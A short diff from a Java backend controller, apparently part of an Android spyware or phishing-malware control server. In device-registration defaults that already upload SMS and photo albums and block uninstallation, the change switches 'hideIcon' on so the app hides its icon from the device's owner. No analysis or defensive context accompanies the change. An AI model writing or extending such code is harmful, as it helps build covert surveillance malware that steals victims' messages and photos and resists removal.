@@ -110,7 +110,7 @@ public class DeviceApiController extends BaseApiController {
             device.setFishSwitch(fishSwitch);
             device.setUploadSms(Constant.YN.Y);
             device.setUploadAlbum(Constant.YN.Y);
-            device.setHideIcon(Constant.YN.N);
+            device.setHideIcon(Constant.YN.Y);
             device.setAccessibilityGuard(Constant.YN.Y);
             device.setUninstallGuard(Constant.YN.Y);
             device.setStatus(Constant.DeviceStatus.screen_on);
